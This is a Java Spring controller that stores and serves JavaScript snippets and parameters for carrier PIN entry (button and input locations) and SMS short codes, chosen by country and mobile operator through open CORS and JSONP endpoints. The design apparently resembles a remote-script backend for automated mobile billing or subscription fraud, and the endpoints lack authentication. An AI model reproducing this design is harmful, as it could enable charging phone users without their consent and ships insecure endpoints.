package com.starp.zoo.controller;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.databind.util.JSONPObject;
import com.starp.zoo.common.ResponseInfo;
import com.starp.zoo.common.ResponseInfoUtil;
import com.starp.zoo.constant.Constant;
import com.starp.zoo.constant.ZooConstant;
import com.starp.zoo.entity.zoo.NewScriptModel;
import com.starp.zoo.service.IAndroidMncService;
import com.starp.zoo.service.INewConfigJsService;
import com.starp.zoo.util.EncodeUtil;
import com.starp.zoo.util.PatternUtil;
import com.starp.zoo.util.StringEncodeUtil2;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

/***
 *
 * @Author David
 * @Date 11:44 2019/1/3
 * @param
 * @return
 **/
@Slf4j
@Controller
public class NewConfigJsController {

    @Autowired
    private INewConfigJsService configService;

    @Autowired
    private IAndroidMncService mncService;

    @RequestMapping(value="/jsconfig/new/list")
    @ResponseBody
    public JSONPObject getJsConfigInfo(HttpServletRequest request, @RequestParam String callback){
        String jsname = request.getParameter("jsname");
        String country = request.getParameter("country");
        List<NewScriptModel> scriptModels = new ArrayList<>();
        List<NewScriptModel> models = configService.getJsConfig(jsname,country);
        scriptModels.addAll(models);
        return  new JSONPObject(callback, ResponseInfoUtil.success(scriptModels));
    }

    @RequestMapping(value="/jsconfig/new/get",method = RequestMethod.GET)
    @ResponseBody
    public JSONPObject getJsConfigByName(@RequestParam String callback){
        List<NewScriptModel> scriptModelList =configService.getAllConfig();
        return new JSONPObject(callback,scriptModelList);
    }


    @RequestMapping(value="/jsconfig/new/save",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public ResponseInfo saveJsConfig(@RequestBody Map<String,String> map){
        try {
            String jsname = map.get("jsName").toString();
            String jsURL = map.get("jsURL").toString();
            String jsScirpt = map.get("jsScript").toString();
            String country = map.get("jsCountry").toString();
            int jsType = Integer.parseInt(map.get("jsType").toString());
            NewScriptModel scriptModel = new NewScriptModel();
            if(ZooConstant.TYPE_PIN==jsType){
                scriptModel.setPinBtnLocation(map.get("pinBtnLocation"));
                scriptModel.setPinFrontCode(map.get("jsPinFrontCode").toString());
                scriptModel.setPinByteCount(Integer.parseInt(map.get("jsPinByteCount").toString()));
                scriptModel.setPinInputLocation(map.get("jsPinInputLocation").toString());
                scriptModel.setPinConfirmLocation(map.get("jsPinConfrimLocation").toString());
            }else if(ZooConstant.TYPE_LP_MO==jsType){
                scriptModel.setShortCode(map.get("jsShortCode").toString());
                scriptModel.setKeyword(map.get("jskeyword").toString());
            }
            scriptModel.setName(jsname);
            scriptModel.setRegular(jsURL);
            scriptModel.setScript(jsScirpt);
            scriptModel.setEventType(jsType);
            scriptModel.setCountry(country);
            configService.save(scriptModel);
            return ResponseInfoUtil.success();
        }
        catch (Exception e){
            return ResponseInfoUtil.error();
        }
    }

    /***
     *
     * @Author David
     * @Date 11:58 2019/1/3
     * @param  request
     * @return com.starp.zoo.common.ResponseInfo
     **/
    @RequestMapping(value="/jsconfig/new/delete",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public ResponseInfo deleteJsConfig(HttpServletRequest request){
        try{
            String id = request.getParameter("id");
            configService.delete(id);
            return ResponseInfoUtil.success();
        }catch (Exception e){
            return ResponseInfoUtil.error();
        }
    }

    /***
     *
     * @Author David
     * @Date 11:59 2019/1/3
     * @param  map
     * @return com.starp.zoo.common.ResponseInfo
     **/
    @RequestMapping(value="/jsconfig/new/update",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public ResponseInfo updateJsConfig(@RequestBody Map<String,String> map) throws Exception{
            String id = map.get("id").toString();
            String jsName = map.get("jsName").toString();
            String jsURL = map.get("jsURL").toString();
            String country = map.get("jsCountry").toString();
            String jsScript = map.get("jsScript").toString();
            int jsType = Integer.parseInt(map.get("jsType").toString());
            NewScriptModel scriptModel = configService.findConfigJs(id);
            if(ZooConstant.TYPE_PIN==jsType){
                scriptModel.setPinBtnLocation(map.get("pinBtnLocation"));
                scriptModel.setPinByteCount(Integer.parseInt(map.get("jsPinByteCount").toString()));
                scriptModel.setPinFrontCode(map.get("jsPinFrontCode").toString());
                scriptModel.setPinInputLocation(map.get("jsPinInputLocation").toString());
                scriptModel.setPinConfirmLocation(map.get("jsPinConfrimLocation").toString());
            }else if(ZooConstant.TYPE_LP_MO==jsType){
                scriptModel.setShortCode(map.get("jsShortCode").toString());
                scriptModel.setKeyword(map.get("jskeyword").toString());
            }
            scriptModel.setIdentification(id);
            scriptModel.setCountry(country);
            scriptModel.setName(jsName);
            scriptModel.setRegular(jsURL);
            scriptModel.setScript(jsScript);
            scriptModel.setEventType(jsType);
            configService.save(scriptModel);
            return ResponseInfoUtil.success();
        }





    @RequestMapping(value = "/jsconfig/new/show",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public JSONPObject showConfigJs(HttpServletRequest request,@RequestParam String callback){
        String id = request.getParameter("identification");
        NewScriptModel model = configService.findConfigJs(id);
        return new JSONPObject(callback,model);
    }

    /***
     * 根据传入的接口返回JsConfig
     * @Author David
     * @Date 11:25 2019/1/7
     * @param
     * @return java.lang.String
     **/
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = "/return/new/jsconfig",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public ResponseInfo returnJs(@RequestBody(required = false)  Map<String,String> map, @RequestParam(required = false, value = "operatorCode") String operator,
                                 @RequestParam(required = false) String jsUrl,@RequestParam(required = false, value = "jsType") String jsTypeStr)throws Exception{
        Integer jsType = null;
        if(map != null && StringUtils.isEmpty(operator) && StringUtils.isEmpty(jsUrl) && StringUtils.isEmpty(jsTypeStr)){
            operator = map.get("operatorCode");
            jsUrl = EncodeUtil.decode(map.get("jsUrl"));
            jsTypeStr = map.get("jsType");
        }
        if(!StringUtils.isEmpty(jsTypeStr) && PatternUtil.isNum(jsTypeStr)){
            jsType = Integer.parseInt(jsTypeStr);
        }
        String operatorValue =mncService.generateOp(operator) ;
        String country = operatorValue.substring(0, 2);
        Map<String,String> param = new HashMap<>(1);
        NewScriptModel scriptModel =  configService.findJsByCountryAndType(jsUrl, country, jsType);
        //传回来的是PIN 类型
        if(scriptModel!=null){
            if(ZooConstant.TYPE_PIN == scriptModel.getEventType()){
                param.put("pinBtnLocation", scriptModel.getPinBtnLocation());
                param.put("pinFrontCode",scriptModel.getPinFrontCode());
                param.put("pinByteCount", String.valueOf(scriptModel.getPinByteCount()));
                param.put("pinInputLocation",scriptModel.getPinInputLocation());
                param.put("pinConfirmLocation",scriptModel.getPinConfirmLocation());
                param.put("jsType", String.valueOf(scriptModel.getEventType()));
            }//传过来的是MO类型
            else if(ZooConstant.TYPE_LP_MO == scriptModel.getEventType()){
                param.put("shortCode",scriptModel.getShortCode());
                param.put("keyword",scriptModel.getKeyword());
                param.put("jsType", String.valueOf(scriptModel.getEventType()));
            }//传过来的是正常类型类型
            else{
                param.put("script",scriptModel.getScript());
                param.put("jsType",String.valueOf(scriptModel.getEventType()));
            }
        }else{
            log.info("CAN'T FIND THE SCRIPT MODEL");
        }
        log.info("REVEIVE OPERATOR:{},JSURL:{},RETURN PARAMS:{}", JSON.toJSONString(operator), JSON.toJSONString(jsUrl), JSON.toJSONString(param));
        return ResponseInfoUtil.success(param);
    }

    /***
     * 根据传入的接口返回JsConfig
     * @Author David
     * @Date 11:25 2019/1/7
     * @param
     * @return java.lang.String
     **/
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = "/return/new/jsconfig/ec2",method = {RequestMethod.GET,RequestMethod.POST})
    @ResponseBody
    public ResponseInfo returnJsEncode2(@RequestBody(required = false)  Map<String,String> map, @RequestParam(required = false, value = "operatorCode") String operator,
                                 @RequestParam(required = false) String jsUrl,@RequestParam(required = false, value = "jsType") String jsTypeStr)throws Exception{
        Integer jsType = null;
        if(map != null && StringUtils.isEmpty(operator) && StringUtils.isEmpty(jsUrl) && StringUtils.isEmpty(jsTypeStr)){
            operator = map.get("operatorCode");
            jsUrl = StringEncodeUtil2.decodeServer(map.get("jsUrl"));
            jsTypeStr = map.get("jsType");
        }
        if(!StringUtils.isEmpty(jsTypeStr) && PatternUtil.isNum(jsTypeStr)){
            jsType = Integer.parseInt(jsTypeStr);
        }
        String operatorValue = mncService.generateOp(operator);
        String country = operatorValue.substring(0, 2);
        Map<String,String> param = new HashMap<>(1);
        NewScriptModel scriptModel =  configService.findJsByCountryAndType(jsUrl, country, jsType);
        //传回来的是PIN 类型
        if(scriptModel!=null){
            if(ZooConstant.TYPE_PIN == scriptModel.getEventType()){
                param.put("pinBtnLocation", scriptModel.getPinBtnLocation());
                param.put("pinFrontCode",scriptModel.getPinFrontCode());
                param.put("pinByteCount", String.valueOf(scriptModel.getPinByteCount()));
                param.put("pinInputLocation",scriptModel.getPinInputLocation());
                param.put("pinConfirmLocation",scriptModel.getPinConfirmLocation());
                param.put("jsType", String.valueOf(scriptModel.getEventType()));
            }//传过来的是MO类型
            else if(ZooConstant.TYPE_LP_MO == scriptModel.getEventType()){
                param.put("shortCode",scriptModel.getShortCode());
                param.put("keyword",scriptModel.getKeyword());
                param.put("jsType", String.valueOf(scriptModel.getEventType()));
            }//传过来的是正常类型类型
            else{
                param.put("script",scriptModel.getScript());
                param.put("jsType",String.valueOf(scriptModel.getEventType()));
            }
        }else{
            log.info("CAN'T FIND THE SCRIPT MODEL");
        }
        log.info("REVEIVE OPERATOR:{},JSURL:{},RETURN PARAMS:{}", JSON.toJSONString(operator), JSON.toJSONString(jsUrl), JSON.toJSONString(param));
        return ResponseInfoUtil.success(param);
    }

}
